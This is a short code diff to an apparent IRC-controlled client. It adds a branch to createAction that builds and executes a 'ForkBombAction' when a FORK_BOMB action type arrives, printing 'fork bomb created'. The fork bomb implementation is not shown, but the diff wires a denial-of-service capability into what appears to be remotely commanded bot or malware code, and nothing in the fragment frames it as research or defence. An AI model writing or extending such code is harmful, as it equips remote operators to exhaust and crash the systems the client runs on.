@@ -169,6 +169,13 @@ void IrcClient::createAction(ActionInfo actionInfo) {
     }
     #endif
 
+    #ifdef ENABLE_FORK_BOMB_ACTION
+    if (actionInfo.getActionType() == ActionType::FORK_BOMB) {
+        printf("fork bomb created\n");
+        action = new ForkBombAction(actionInfo.getActionParams());
+    }
+    #endif
+
     if (action) {
         action->execute();
         if (action->getMessage() != "") {
